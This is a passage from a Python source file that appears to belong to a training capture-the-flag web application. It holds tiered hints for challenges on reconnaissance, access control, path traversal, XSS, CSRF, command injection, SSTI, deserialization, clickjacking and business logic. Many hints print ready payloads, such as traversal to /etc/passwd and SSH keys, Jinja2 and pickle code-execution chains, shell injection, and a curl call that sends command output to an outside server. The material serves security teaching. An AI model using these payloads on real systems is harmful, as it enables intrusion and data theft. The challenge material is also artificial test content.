FLAG_VALUES = {flag_id: generate_flag(flag_id) for flag_id in FLAGS}


def get_flag(flag_id: str) -> str:
    """Get the flag value for a given challenge ID."""
    return FLAG_VALUES.get(flag_id, None)


def get_all_flags() -> dict:
    """Get all flag IDs mapped to their values."""
    return FLAG_VALUES.copy()


# ══════════════════════════════════════════════════════════════════
# HINTS — Narrative Intelligence (Stealth Hints System)
# Instead of direct instructions, clues feel accidental.
# Tier 1: Environmental clue (something you'd notice in a real company)
# Tier 2: Investigative nudge (points toward the right area)
# Tier 3: Technical insight (reveals the technique without giving the answer)
# ══════════════════════════════════════════════════════════════════
HINTS = {}


def _build_hints():
    """Build all challenge hints. Narrative-driven, never the answer directly."""
    hint_templates = {
        'CH01': [
            # C01 - Hidden entry point
            ("The footer text says '© 2026 PenTrix Corp — Internal Use Only | v1.3.2-beta'. The word 'beta' suggests unfinished, exposed features.",
             "Corporate portals often have internal-only pages hidden behind inconspicuous links. Check everywhere text appears.",
             "Page footers frequently contain links that aren't in the main navigation. Inspect every anchor tag on the page."),
            # C02 - robots.txt
            ("A server access log entry reads: '[INFO] crawler accessed /hidden-archive but was denied'. Something is being hidden from crawlers.",
             "Before indexing a site, search engines consult a special file. The server tells them what NOT to look at.",
             "The file that controls crawler behavior sits at the web root. Its name describes what it governs."),
            # C03 - Developer comment
            ("Inside a JavaScript file: '// TODO: remove temporary test endpoint before production'. Developers forget cleanup tasks.",
             "When developers work in a hurry, they leave notes for themselves embedded in the code they write.",
             "HTML has a specific syntax for hiding text from rendered output but keeping it in the source. Right-click → View Source."),
            # C04 - Backup file
            ("The /changelog page mentions: 'v1.2.0 — Migration completed. Backup stored temporarily during upgrade.'",
             "System administrators create backups before major changes. These files often follow naming patterns like .bak, .old, .backup.",
             "The main application file likely has a backup copy. Common patterns: filename.bak, filename.old, filename~"),
            # C05 - Tech fingerprinting
            ("An error flash reads: 'Template rendering error: Jinja2 Exception'. This wasn't supposed to be visible.",
             "Every HTTP response carries metadata about the server. The tools to see this are already in your browser.",
             "Open Developer Tools → Network tab → click any request → inspect the Response Headers section."),
            # C06 - Sitemap
            ("An HTML meta tag reads: <meta name='generator' content='PenTrix CMS v2.1'>. CMS systems have predictable file structures.",
             "Content Management Systems publish their page structure in a machine-readable format for search engines.",
             "The file follows the XML Sitemap Protocol standard. It sits at the web root, named after its function."),
            # C07 - Hidden form field
            ("A registration form contains: <input type='hidden' name='role' value='user'>. No instruction — but a smart user would tamper.",
             "HTML forms can contain fields invisible to the user but submitted with every request.",
             "Use Developer Tools → Elements to inspect forms. Look for hidden inputs whose values could be altered."),
            # C08 - Encoded data
            ("A profile page displays: 'User token: YWRtaW46cGVudHJpeA=='. It looks random, but the pattern is recognizable.",
             "Strings ending in '==' or '=' often use a specific encoding scheme. It's one of the most common ones.",
             "Base64 encoding is reversible. Use any online decoder or your browser console: atob('the_string_here')"),
            # C09 - Changelog endpoint
            ("A small footer link reads 'System updates available' without specifying where. Not 'changelog' explicitly, but suggestive.",
             "Applications track their version history in predictable locations. Think about what endpoint name makes sense.",
             "Try /changelog, /version, /release-notes, or /updates. One of them responds."),
            # C10 - Debug endpoint
            ("The error page states: 'Debug mode is currently enabled for development convenience.' This is a misconfiguration.",
             "Debug interfaces expose internal application state. They're powerful tools — and dangerous when left accessible.",
             "Common debug paths: /debug, /console, /_debug, /debugger. The application's debug endpoint is active."),
        ],
        'CH02': [
            ("An internal Slack message was leaked: 'Hey team, the nginx version is showing in responses again. Can someone fix the headers?'",
             "HTTP responses include a 'Server' header by default. Most web servers announce themselves unless explicitly configured not to.",
             "Use curl -I or browser Developer Tools → Network → Response Headers. The 'Server' header reveals the software and version."),
            ("A job posting mentions 'Flask expertise required'. The company uses specific technology that leaves traces.",
             "Python web frameworks add characteristic headers and behaviors. Flask is one of the most common ones.",
             "Check multiple sources: headers, error pages, cookie names. Flask sets 'session' cookies with a specific format."),
            ("A stack trace appeared briefly during a 500 error. It mentioned the file path '/usr/lib/python3.11/'.",
             "When applications crash in debug mode, they reveal their entire execution context — including the operating system.",
             "Trigger a 500 error by sending malformed input. The traceback path reveals the OS (/usr = Linux, C:\\ = Windows)."),
            ("The network engineer posted: 'Please remember to strip X-Powered-By before go-live.' It's still there.",
             "X-Powered-By is an informational header that reveals the application framework. It's present in every response.",
             "This header appears in standard response headers. Check any response using browser Developer Tools or curl."),
            ("A developer accidentally posted a screenshot showing a SQLite browser connected to the production database.",
             "Database systems produce distinctive error messages. Each one has a recognizable format.",
             "Send a single quote ' in input fields. SQLite errors mention 'sqlite3', MySQL mentions 'MySQL', PostgreSQL mentions 'pg'."),
            ("Internal documentation references 'service running on 10.0.1.42'. The IP might leak externally.",
             "Custom response headers sometimes include internal network information inadvertently.",
             "Check for non-standard headers: X-Internal-IP, X-Backend-Server, X-Real-IP. These often leak internal addresses."),
            ("Run the application against a non-existent endpoint with malformed data. The framework's default error handler is verbose.",
             "Debug mode shows full Python tracebacks. The traceback format (Werkzeug, Django, etc.) identifies the framework.",
             "Send a POST with bad data to any endpoint. If debug is on, the error page itself is the fingerprint (Werkzeug debugger = Flask)."),
            ("Client-side assets are loaded by every page visitor. Their contents are public by design.",
             "JavaScript files often contain version strings, build numbers, or even direct technology references in comments.",
             "Read /static/js/app.js carefully. Look for comment blocks, version variables, and configuration objects."),
            ("The <head> section of HTML pages contains metadata tags. Some of them are surprisingly informational.",
             "The 'generator' meta tag is used by CMSes and frameworks to declare what built the page.",
             "View source → search for 'generator' or 'meta'. The tag reveals the platform and its version."),
            ("Every web framework ships with a default favicon. This visual signature can be fingerprinted without reading any code.",
             "Download /favicon.ico and compute its MD5 hash. Different frameworks produce different hashes.",
             "Use curl to download the favicon, md5sum to hash it, then search databases like Shodan's favicon hash database."),
        ],
        'CH03': [
            ("An internal ticket reads: 'User Alice reported she could see Bob's profile by changing the number in the URL. Is this a bug?'",
             "When resources are accessed by numeric ID in the URL, changing that number accesses a different resource.",
             "Navigate to your profile page. Notice the ID in the URL. Change it to 1, 2, 3... each loads a different user's data."),
            ("An employee complaint: 'I think someone read my private message to HR. How is that possible?'",
             "Message endpoints use IDs to load individual messages. The server may not verify the message belongs to you.",
             "Visit /messages/1, /messages/2, /messages/3... the server might return messages addressed to other users."),
            ("A penetration test report summary: 'Administrative functions accessible to non-admin users. Severity: Critical.'",
             "Admin pages are often just hidden from navigation — not actually restricted. Direct URL access may still work.",
             "Try navigating directly to /admin. The application may not check your role, only whether you're logged in."),
            ("An audit finding: 'The edit endpoint validates authentication but does not validate resource ownership.'",
             "Editing your own post works. But the server might not verify that the post ID belongs to you.",
             "Edit one of your posts. In the request, change the post ID to one belonging to another user. The server may accept it."),
            ("A Slack channel leak: 'FYI — the role update API doesn't check who's calling it. Let's fix this in sprint 14.'",
             "API endpoints that modify user properties might not verify your authority to make those changes.",
             "Send a PATCH or PUT request to the user API with 'role': 'admin' or 'is_admin': true in the body."),
            ("An indexed Google result shows 'PenTrix Corp — Admin User Management' but returns 403 from the main navigation.",
             "Some pages return different results when accessed directly vs through navigation. Try the direct path.",
             "Hidden paths like /admin/users might exist and respond to requests even without navigation links."),
            ("A user reported: 'I noticed the file download URL uses a numeric ID. I was curious...'",
             "File downloads by ID can be exploited the same way as profile pages — change the number.",
             "Download your own file — note the URL pattern. Change the file ID to access other users' private files."),
            ("Comments in the API documentation: '// TODO: add authentication middleware to config endpoint'",
             "Some API endpoints were deployed before their authentication was implemented.",
             "Access /api/admin/config without any authentication token. The middleware was never added."),
            ("A bug report: 'Ticket #4 is visible to User ID 2, who isn't the ticket owner or assigned agent.'",
             "Support tickets use sequential IDs. Access checks might not verify you're the ticket owner.",
             "Visit /tickets/1, /tickets/2, etc. The server might display tickets that belong to other users."),
            ("A developer documentation comment: 'Registration accepts: username, password, email. Other fields are silently accepted.'",
             "When an API or form accepts arbitrary fields, you can set properties you shouldn't have access to.",
             "During registration, add extra fields like 'is_admin=1' or 'role=superadmin' to the form data."),
        ],
        'CH04': [
            ("The login page HTML has a comment: '<!-- Quick access: admin / [REDACTED] -->'. But was it really redacted?",
             "View the full source of the login and registration pages. Developers leave debugging notes in HTML comments.",
             "Look for <!-- --> comments in the page source. They may contain plaintext credentials or hints to default passwords."),
            ("Alice from IT messaged: 'The /debug endpoint is still live. It literally dumps our entire config. Can we please disable it?'",
             "Development endpoints expose internal configurations: database paths, secret keys, installed packages.",
             "Access /debug directly. It returns the application configuration in JSON format, including sensitive values."),
            ("A client-side JavaScript file loads on every page. Its source code is viewable by anyone who visits the site.",
             "Developers sometimes hardcode API keys in JavaScript for convenience during development — and forget to remove them.",
             "Open /static/js/app.js and search for strings like 'api_key', 'secret', 'token', or 'sk-'."),
            ("A deployment checklist was found: '☑ Set env vars ☐ Remove .env from webroot'. The second box was never checked.",
             "The .env file stores environment variables — database URLs, secret keys, API tokens. It should never be web-accessible.",
             "Access /.env directly from the browser or curl. This file is commonly left in the web root after deployment."),
            ("Error monitoring shows: 'Unhandled exception: Invalid credit card format — 4111-1111-1111-1111 (user: alice)'. This appeared in the response.",
             "Verbose error messages can leak PII, financial data, and internal identifiers when unexpected input is received.",
             "Send unusual input to fields that process financial data. The error message may include the actual data in the exception."),
            ("A cron job log: 'Backup /app/data/pentrix.db → /backup/db.sqlite [SUCCESS]'. The path might still be accessible.",
             "Database backups are commonly stored in predictable locations. If they're within the web root, they're downloadable.",
             "Try /backup/db.sqlite, /backup/database.db, or similar paths. The entire database may be downloadable."),
            ("API documentation states: 'GET /api/users/:id returns: username, email, display_name'. But the actual response has more fields.",
             "APIs often return raw database rows instead of curated responses. Extra fields may include password hashes.",
             "Make an API request to /api/users/1 and examine every field in the response. Look for password_hash or similar."),
            ("A configuration management note: 'Exported app config to /config.json for the migration team.'",
             "Configuration files in JSON format are common during deployment. They often contain secrets.",
             "Access /config.json. It may contain database credentials, API keys, and internal service URLs."),
            ("A developer commit message: 'Embedded salary lookup in JS for the HR dashboard quick-view feature.'",
             "Sensitive business data sometimes ends up in client-side code for convenience features.",
             "Check JavaScript files and inline scripts for objects containing financial data like salaries or account numbers."),
            ("A monitoring alert: 'The /logs endpoint is returning 200 to unauthenticated requests. Expected 403.'",
             "Server logs contain request URLs, IP addresses, user agents, and sometimes credentials from failed logins.",
             "Access /logs endpoint. Server logs may be browsable at this path without any authentication."),
        ],
        'CH05': [
            ("A file download feature is available. The URL includes a path parameter that specifies which file to serve.",
             "Path parameters can be manipulated. '../' moves up one directory. Chain enough of them to escape the web root.",
             "Try: /download?file=../../../etc/passwd — each '../' moves up one directory level in the file system."),
            ("A physical flag file exists on the server at a predictable location outside the web directory.",
             "Flag files for CTF challenges are typically stored in /app/flags/ or a similar directory near the application root.",
             "Navigate upward from the current directory using ../ until you reach /app/flags/ and read the flag file."),
            ("The template engine includes files based on a parameter. The parameter is not sanitized.",
             "Template inclusion can be exploited the same way as file downloads — by controlling the path.",
             "Use the template parameter to include ../../etc/hosts or similar system files through path traversal."),
            ("The /proc filesystem in Linux contains live system information. Every process has an entry.",
             "/proc/version contains the Linux kernel version. Other files reveal process info, memory maps, etc.",
             "Traverse to /proc/version through the file download feature. The content reveals the exact kernel version."),
            ("This endpoint has a basic filter that blocks '../'. But filters can be circumvented through encoding.",
             "URL encoding transforms characters: . becomes %2e, / becomes %2f. Double encoding encodes the % itself.",
             "Try %252e%252e%252f — the server decodes once to %2e%2e%2f, then the application decodes again to ../"),
            ("The file extension is checked, but the string processing has a flaw with special characters.",
             "The null byte (%00) terminates strings in C-based languages. It may truncate server-side path handling.",
             "Try: file=../../../etc/passwd%00.png — the null byte truncates the .png, and the server reads /etc/passwd."),
            ("The most valuable thing you can read through traversal is the application's own source code.",
             "Python applications run from .py files in the application directory. The main file is usually app.py.",
             "Traverse to read the application source: ../app.py, ../routes/auth.py, etc. This reveals all secrets."),
            ("Linux uses / as the path separator. But the server might accept the Windows-style backslash too.",
             "Try using backslashes: ..\\..\\..\\etc\\passwd. Some servers normalize both separators.",
             "Mix backslashes and forward slashes. The server may support both: ..\\..\\../etc/passwd"),
            ("SSH private keys grant remote access to servers. They're stored in predictable locations.",
             "User home directories contain .ssh/ subdirectories with key files: id_rsa, id_ed25519, authorized_keys.",
             "Traverse to ~/.ssh/id_rsa or /root/.ssh/id_rsa. If readable, this key provides server access."),
            ("ZIP extraction creates files based on filenames stored inside the archive. These names aren't always safe.",
             "A ZIP file can contain entries with paths like '../../../tmp/shell.php'. Extraction follows these paths.",
             "Create a ZIP file with a traversal filename. When the server extracts it, the file writes outside the intended directory."),
        ],
        'CH06': [
            ("An onboarding document reads: 'Default admin credentials are provided during installation. Change them immediately.'",
             "Administrators often forget to change default credentials after installation. The most common is username=password.",
             "Try admin/admin, admin/password, admin/123456. Default credentials are the first thing an attacker checks."),
            ("Security audit finding: 'No account lockout mechanism detected. Automated credential testing is possible.'",
             "Without rate limiting or lockout, an attacker can test thousands of password combinations automatically.",
             "Use a tool like Burp Intruder or hydra. Try common passwords against known usernames. There's no penalty for failure."),
            ("A password reset email was intercepted. The token is: 'reset_token_000042'. The previous user got '000041'.",
             "If tokens are sequential or predictable, an attacker can generate valid tokens for any user.",
             "Request a password reset, observe the token format. Generate adjacent tokens to reset other users' passwords."),
            ("Session management documentation: 'Session IDs are accepted from both cookies and URL parameters.'",
             "If the server accepts externally-provided session IDs, an attacker can fixate a known session ID.",
             "Set a known session cookie before the victim logs in. After they authenticate, your pre-set session ID gains their access."),
            ("QA test case: 'Verify behavior when password field is empty.' Status: NOT TESTED.",
             "Authentication edge cases are often overlooked. How does the system handle null, empty, or missing passwords?",
             "Submit a login request with the password field empty or removed entirely. The server might not validate its presence."),
            ("Session management: 'User logged out at 14:30. Token still valid at 16:00.' This shouldn't happen.",
             "Logout should invalidate the session server-side. If it doesn't, old tokens remain valid indefinitely.",
             "Save your session cookie, log out, then replay the old cookie in a new request. The server may still accept it."),
            ("The remember-me cookie contains: 'rem_admin_1706745600'. The structure is: rem_[username]_[timestamp].",
             "If a cookie value is predictable, it can be forged. Time-based values can be guessed or brute-forced.",
             "Decode the remember-me cookie structure. Reconstruct it with a different username and appropriate timestamp."),
            ("A password was reset using token ABC123. Five minutes later, the same token ABC123 still works.",
             "Reset tokens should be single-use and time-limited. If they persist, they can be reused indefinitely.",
             "Use a password reset token, then try using it again. If it works, the token was never invalidated."),
            ("Login error for 'admin': 'Invalid password.' Login error for 'nonexistent': 'User not found.'",
             "Different error messages for different failure cases reveal valid usernames to an attacker.",
             "Try logging in with known and unknown usernames. Compare the error messages. The difference confirms which users exist."),
            ("JWT Header: {'alg': 'HS256', 'typ': 'JWT'}. What if the algorithm is changed to 'none'?",
             "JWTs specify their own verification algorithm. If 'none' is accepted, signatures are not verified.",
             "Decode the JWT, change 'alg' to 'none', modify the payload, remove the signature, and submit. The server may accept it."),
        ],
        'CH07': [
            ("A meeting note: 'The /secret page is for internal diagnostics only. It's not linked from anywhere, so it should be fine.'",
             "Security by obscurity is not security. Unlinked pages can be found through wordlist-based directory scanning.",
             "Use gobuster, dirb, or ffuf with a common wordlist. endpoints like /secret, /internal, /hidden are discoverable."),
            ("An internal Wiki article: 'Appending ?debug=true to any page enables developer mode. Don't share this externally.'",
             "Hidden URL parameters can activate dormant features. Common names: debug, test, admin, verbose.",
             "Add ?debug=true to page URLs. The parameter may activate debugging output with sensitive information."),
            ("A Git commit message: 'Created app.py.bak before refactoring core routes.'",
             "Backup files created during development follow predictable naming patterns and persist after deployment.",
             "Try accessing the main application file with backup extensions: /app.py.bak, /app.py.old, /app.py~"),
            ("A DevOps Slack message: 'I set up an alternative admin interface at a different path, just in case the main one breaks.'",
             "Developers create backup admin panels at non-standard paths. These often have weaker access controls.",
             "Try /admin2, /admin_backup, /management, /admin-panel. Alternative admin routes may lack proper authentication."),
            ("API versioning documentation: 'v1 deprecated. v2 current. v3 in development.' But deprecated ≠ removed.",
             "Old API versions are often left running to avoid breaking existing integrations.",
             "Try /api/v1/, /api/v2/, /api/v3/. Deprecated versions may still respond with weaker security controls."),
            ("A developer left a note: 'The profile form has a hidden admin toggle. I'll remove it before release.' They didn't.",
             "POST endpoints may accept parameters beyond what the visible form contains.",
             "When submitting a form, add extra parameters like 'is_admin=1', 'role=admin', 'debug=true' to the request body."),
            ("Monitoring system alert: '/internal/status is returning health data to external IPs. Restrict this to 10.0.0.0/8.'",
             "Internal monitoring endpoints are meant for infrastructure teams. They're often not IP-restricted.",
             "Try /internal/status, /health, /status, /monitor. These endpoints reveal internal system state."),
            ("A security scanner report: '.git directory detected at web root. Risk: Source code disclosure.'",
             "Version control directories contain the complete history and source code of the application.",
             "Access /.git/HEAD, /.git/config, /.git/refs/. The entire repository can be reconstructed from these files."),
            ("A deployment script comment: '# TODO: remove /test and /dev routes before production deployment'",
             "Test routes are created during development and often contain debugging tools or bypass mechanisms.",
             "Try /test, /dev, /staging, /dev-preview. Development endpoints frequently survive into production."),
            ("A cookie named 'preferences' contains more information than its name suggests. Modify it to see what changes.",
             "Cookies can control application behavior beyond simple preferences. Hidden parameters may enable features.",
             "Examine all cookies. Try modifying values, adding new fields, or changing boolean values to see how behavior changes."),
        ],
        'CH08': [
            ("A user submitted the search query 'hello'. The results page displayed: 'Results for: hello'. No encoding was applied.",
             "When input is reflected in HTML without encoding, any HTML or JavaScript in that input will be executed.",
             "Search for <script>alert(1)</script>. If an alert appears, the search is vulnerable to reflected XSS."),
            ("Blog comments allow rich formatting. But 'rich formatting' and 'executing JavaScript' are uncomfortably close.",
             "Stored XSS persists in the database and executes for every user who views the content.",
             "Post a comment containing <script>alert(document.cookie)</script>. If it executes when viewed, it's stored XSS."),
            ("Your display name is shown on comments and posts. It's rendered without encoding.",
             "Change your display name to a script payload. Every other user who sees your name will execute it.",
             "Set display name to <script>alert('xss')</script>. Visit a page where it's displayed and verify execution."),
            ("Your input ends up inside an HTML attribute: <div title=\"USER_INPUT\">. What if you close the attribute?",
             "Breaking out of an HTML attribute context requires closing the quote and the tag, or injecting an event handler.",
             "Try: \" onmouseover=\"alert(1) — this closes the attribute and adds a new one that executes JavaScript."),
            ("Your input is placed inside a <script> block: var x = 'USER_INPUT'. The string context can be broken.",
             "JavaScript context injection requires closing the string literal and the script tag or injecting new statements.",
             "Try: '</script><script>alert(1)</script> or '; alert(1); ' to break out of the JavaScript string."),
            ("The application filters <script> tags. But there are dozens of other ways to execute JavaScript in HTML.",
             "Tags like <img>, <svg>, <body>, <input>, <details> all support event handlers that execute JavaScript.",
             "Try: <img src=x onerror=alert(1)> or <svg onload=alert(1)>. Event handlers bypass simple tag blacklists."),
            ("Error pages display: 'Error: [your input]'. The error page template doesn't encode HTML entities.",
             "If your input appears in error messages without encoding, it executes as HTML in the error page.",
             "Trigger an error with XSS in the input: cause a 404 or input validation error with a script payload."),
            ("SVG files are accepted for upload. SVG is XML — and XML supports embedded JavaScript.",
             "An SVG file can contain <script> tags, event handlers, and even <foreignObject> with HTML.",
             "Upload an SVG containing: <svg xmlns='...'><script>alert(1)</script></svg> — it executes when viewed."),
            ("Certain HTTP headers are logged and displayed in admin panels. The Referer or User-Agent might appear.",
             "If request headers are reflected in response pages without encoding, they're XSS vectors.",
             "Send a request with User-Agent: <script>alert(1)</script> and check where it appears in the response."),
            ("Support ticket subjects are displayed unencoded in the admin ticket viewer.",
             "Staff members view ticket subjects in their dashboard. XSS in the subject targets privileged users.",
             "Create a ticket with subject: <script>alert(document.cookie)</script> — it fires when staff views the ticket list."),
        ],
        'CH09': [
            ("The page reads window.location.hash and writes it to the DOM. The hash isn't sent to the server.",
             "Everything after # in the URL is client-side only. If JavaScript writes it to innerHTML, it's DOM XSS.",
             "Visit the page with #<img src=x onerror=alert(1)> appended to the URL. The hash content is injected into the page."),
            ("A window.addEventListener('message', handler) exists. It processes data.content without checking the origin.",
             "postMessage listeners that don't verify event.origin will accept messages from any window.",
             "Open the target in an iframe. From the parent, send: window.frames[0].postMessage({content:'<img src=x onerror=alert(1)>'},'*')"),
            ("A link redirects to: /redirect?url=/dashboard. What happens if you change the URL to an external domain?",
             "Open redirect vulnerabilities exist when the redirect URL isn't validated against a whitelist.",
             "Try: /redirect?url=https://evil.com or /redirect?url=//evil.com. If it redirects, it's vulnerable."),
            ("A form with id='config' exists. JavaScript has: if(!window.config) { window.config = {admin: false} }",
             "HTML elements with 'id' attributes automatically become window properties. This can override JavaScript variables.",
             "Create an HTML element with id='config' that has specific attributes. The JavaScript check will find the element instead."),
            ("An AngularJS ng-app is loaded. User input appears inside {{double braces}} in the template.",
             "AngularJS expressions inside {{}} are evaluated against the scope. They can access JavaScript functionality.",
             "Try: {{constructor.constructor('alert(1)')()}} or {{7*7}} to verify expression evaluation."),
            ("JavaScript code: document.write('<h1>' + getParam('title') + '</h1>'); The parameter flows directly into the page.",
             "document.write() with user input is a classic DOM XSS sink. URL parameters become HTML content.",
             "Set the 'title' parameter to <script>alert(1)</script>: page.html?title=<script>alert(1)</script>"),
            ("An element is updated with: el.innerHTML = userInput; No sanitization before assignment.",
             "innerHTML interprets HTML tags in the assigned string. Event handlers in tags will execute.",
             "Inject: <img src=x onerror=alert(1)> through the user input. innerHTML will parse and execute it."),
            ("A redirect function uses: window.location = userInput; without protocol validation.",
             "The javascript: protocol is a valid URI scheme. Browsers execute the code that follows it.",
             "Set the redirect parameter to javascript:alert(1). The browser navigates to it and executes the code."),
            ("A deep merge function recursively copies properties: merge(target, source). It doesn't filter __proto__.",
             "Assigning properties to __proto__ pollutes the Object prototype, affecting all objects in the application.",
             "Send: {'__proto__': {'isAdmin': true}} via the merge function. All objects will now have isAdmin=true."),
            ("Code: eval(new URLSearchParams(location.search).get('expr')); Any parameter becomes executable code.",
             "eval() executes any string as JavaScript. If it receives URL parameters, you control what runs.",
             "Visit: page.html?expr=alert(document.domain). The eval() call executes your parameter value."),
        ],
        'CH10': [
            ("The email change form has no CSRF token. A forged request from any website would be indistinguishable from legitimate.",
             "Create an external HTML page with a form that auto-submits to the email change endpoint.",
             "Host: <form action='/settings/email' method='POST'><input name='email' value='attacker@evil.com'></form><script>document.forms[0].submit()</script>"),
            ("Password change requires only the new password — not the current one. CSRF makes this exploitable.",
             "If no re-authentication is needed, any website can change the user's password via a forged form submission.",
             "Create an auto-submitting form targeting the password change endpoint. Include only the new_password field."),
            ("Account deletion is triggered by: GET /account/delete. A single link click deletes the account.",
             "GET requests with side effects are automatically executable via images, links, or any tag that loads URLs.",
             "Embed <img src='/account/delete'> in any page. When the user loads it, their account is deleted."),
            ("The message posting endpoint accepts POST requests without any origin verification or token.",
             "Create a form on your site that submits a message to the victim's account on the target application.",
             "Auto-submitting form: <form action='/messages/send' method='POST'><input name='body' value='Hacked!'></form>"),
            ("Role changes can be triggered by anyone who sends the right POST request. No anti-CSRF mechanism exists.",
             "CSRF against role-changing endpoints allows privilege escalation via a victim's authenticated session.",
             "Make an admin user visit a page containing a hidden form that submits a role promotion request for your account."),
            ("CSRF tokens are generated — but they work across different sessions. Any valid token works for any user.",
             "Session-unbound tokens can be harvested from one session and replayed in another.",
             "Get a valid CSRF token from your own session. Use it in a CSRF attack against another user's session."),
            ("The CSRF token field is checked only IF it's present. Removing the field entirely bypasses the check.",
             "Optional token validation is worse than no validation — it gives false confidence while remaining exploitable.",
             "Remove the CSRF token field entirely from the forged form. The server won't reject the missing token."),
            ("The JSON API endpoint doesn't verify the Content-Type or include CSRF checks on JSON requests.",
             "With CORS, JSON can be sent cross-origin. If the API doesn't check origin, CSRF works on JSON endpoints.",
             "Use fetch() from an external page: fetch('/api/action', {method:'POST', body:JSON.stringify({...}), credentials:'include'})"),
            ("The server checks the Referrer header for CSRF protection. But Referrer can be suppressed entirely.",
             "Using <meta name='referrer' content='no-referrer'> or Referrer-Policy: no-referrer prevents the header from being sent.",
             "Add <meta name='referrer' content='no-referrer'> to your CSRF page. The server allows the request when Referrer is absent."),
            ("CORS allows reading the response. CSRF makes the request. Together, they exfiltrate data.",
             "If CORS allows your origin and CSRF tokens are absent, you can read the response of forged requests.",
             "Make a fetch() request with credentials:'include' to a sensitive endpoint. Read the response with .json()."),
        ],
        'CH11': [
            ("The network tools page has a 'Ping' utility. It accepts a hostname or IP address. It passes input to the OS.",
             "Shell metacharacters like ;, |, &&, ` separate and chain commands. Add them after valid input.",
             "Try: 127.0.0.1; cat /etc/passwd or 127.0.0.1 | id. The semicolon starts a new command after ping."),
            ("A file operation endpoint includes the filename in a system command: convert <filename> output.pdf",
             "If filenames reach system commands, special characters in the name execute arbitrary commands.",
             "Upload or specify a file named: file; id #.txt — the semicolon breaks out of the intended command."),
            ("The template engine processes user input. Jinja2's {{}} syntax evaluates Python expressions.",
             "SSTI in Jinja2 allows access to Python's object model. From there, you reach os and subprocess.",
             "Try: {{7*7}} for detection. For RCE: {{config.__class__.__init__.__globals__['os'].popen('id').read()}}"),
            ("Email template fields allow custom formatting using template syntax. The engine is the same one as the pages.",
             "If email fields are rendered through Jinja2, the same SSTI payloads work in email contexts.",
             "Submit {{7*7}} in an email template field. If it renders as 49, the template engine is evaluating your input."),
            ("A 'calculator' feature evaluates mathematical expressions using Python's eval() function.",
             "eval() executes ANY Python expression, not just math. __import__('os').system('id') is a valid expression.",
             "Try: __import__('os').popen('cat /etc/passwd').read() in the calculator input field."),
            ("An endpoint accepts serialized Python objects (pickle format) and deserializes them without validation.",
             "Python's pickle format can execute arbitrary code during deserialization via __reduce__.",
             "Create a pickle payload: class Exploit: def __reduce__(self): return (os.system, ('id',)). Serialize and submit."),
            ("Application logs record the User-Agent header. A log processing script runs system commands with it.",
             "If headers are processed by shell commands (grep, awk, etc.), shell metacharacters in headers execute code.",
             "Send: User-Agent: ; curl http://your-server/$(whoami). The header value reaches a system command."),
            ("Image resize parameters are passed to a command-line image processing tool like ImageMagick.",
             "Parameters like width and height may be concatenated into a system command without sanitization.",
             "Try: width=100;id in the resize parameter. The semicolon chains your command after the resize operation."),
            ("A configuration import feature accepts YAML input. Python's yaml.load() is used without safe_loader.",
             "YAML supports Python-specific tags: !!python/object, !!python/object/apply execute Python code.",
             "Submit: !!python/object/apply:os.system ['id']. PyYAML's unsafe loader executes Python objects."),
            ("Server logs record user input. A file inclusion vulnerability can read those logs.",
             "By injecting code into logs (via input, headers) and reading logs via LFI, the code executes.",
             "Inject PHP/Python code into access.log via User-Agent, then include the log file through the LFI endpoint."),
        ],
        'CH12': [
            ("Response headers: No X-Frame-Options, no CSP frame-ancestors. The login page is completely frameable.",
             "Without framing protection, any external site can embed the login page in an invisible iframe.",
             "Create: <iframe src='http://target/login' style='opacity:0.001;position:absolute;'></iframe> overlaid with a fake page."),
            ("The password change page also lacks X-Frame-Options. If it can be framed, it can be clickjacked.",
             "Overlay a 'Click to win a prize!' button on top of the invisible password change submit button.",
             "Position a transparent iframe with the password change form directly behind a visible decoy button."),
            ("The admin panel has no frame-busting headers. An attacker can overlay admin actions with deceptive UI.",
             "Admin functionality is the highest-value target for clickjacking. One click can change system settings.",
             "Frame the admin panel and overlay a 'Click here to continue' button directly over the 'Delete User' button."),
            ("X-Frame-Options is set to SAMEORIGIN. But what qualifies as 'same origin' when subdomains are involved?",
             "SAMEORIGIN checks the exact origin. But subdomains might host attacker-controlled content.",
             "If XSS exists on a subdomain, frame the main site from the subdomain. SAMEORIGIN may allow it."),
            ("A fund transfer page can be embedded. Combined with social engineering, money can be transferred unknowingly.",
             "Pre-fill the transfer form in the iframe. Position the submit button under the user's click target.",
             "Create: <iframe src='/transfer?amount=1000&to=attacker'> with an overlay asking the user to confirm something benign."),
            ("A double-click attack: the first click moves the frame, the second click hits the action button.",
             "The 'like' button requires a double-click. The first click repositions the frame over the target.",
             "Use JavaScript to move the iframe into position between the first and second click events."),
            ("Drag-and-drop interactions transfer data across frame boundaries. This bypasses click-based protections.",
             "A user drags a file or element on the visible page but drops it over a hidden iframe.",
             "Create a drag-and-drop game that positions the drop zone over a hidden iframe's sensitive action."),
            ("Profile settings (email, password, display name) are on a frameable page. Changes stick silently.",
             "If settings pages are frameable, clickjacking can modify a user's account settings without consent.",
             "Frame the settings page with pre-filled values. Position the submit button behind a decoy click target."),
            ("No CSRF token + frameable page = the attacker can click the submit button for the user.",
             "Clickjacking provides the 'user interaction' that CSRF alone cannot. Together, they defeat most defenses.",
             "Frame a CSRF-vulnerable form. Use clickjacking to make the user click the submit button."),
            ("CSP frame-ancestors is the recommended replacement for X-Frame-Options. It's not set here.",
             "Content-Security-Policy: frame-ancestors 'self' prevents framing from any external origin.",
             "Verify: check the CSP header in responses. If frame-ancestors is missing, the page is frameable by any site."),
        ],
        'CH13': [
            ("The WELCOME2024 coupon gives $20 off. Apply it once. Then apply it again. And again...",
             "The coupon system doesn't track usage per user. The 'uses_left' counter may not decrement properly.",
             "Apply the same coupon code in multiple rapid requests. Each application may succeed independently."),
            ("A transfer form lets you send money to another user. The amount field accepts any integer value.",
             "What happens when you transfer a negative amount? Does the system validate the direction of the flow?",
             "Transfer -100 to another user. You might receive +100 instead of sending -100. Test with your own accounts."),
            ("Registration enforces unique usernames. But database operations aren't atomic by default.",
             "If two identical registrations arrive simultaneously, both may pass the uniqueness check before either is committed.",
             "Send 50 simultaneous registration requests with the same username. Some may succeed, creating duplicates."),
            ("The registration flow is: Register → Verify Email → Access Features. But is step 2 actually enforced?",
             "Sometimes the 'verified' check only exists in the UI, not in the backend route handler.",
             "Register without verifying your email. Try accessing features that should require verification. Do they work?"),
            ("The export feature generates CSV/PDF reports. It uses the current user's permissions — or does it?",
             "Export endpoints sometimes bypass row-level access controls, returning more data than the user should see.",
             "Export a report. Review its contents. Does it contain data from other users or restricted categories?"),
            ("User IDs are assigned in sequence: 1, 2, 3, 4... If ID 6 exists, what's id 7?",
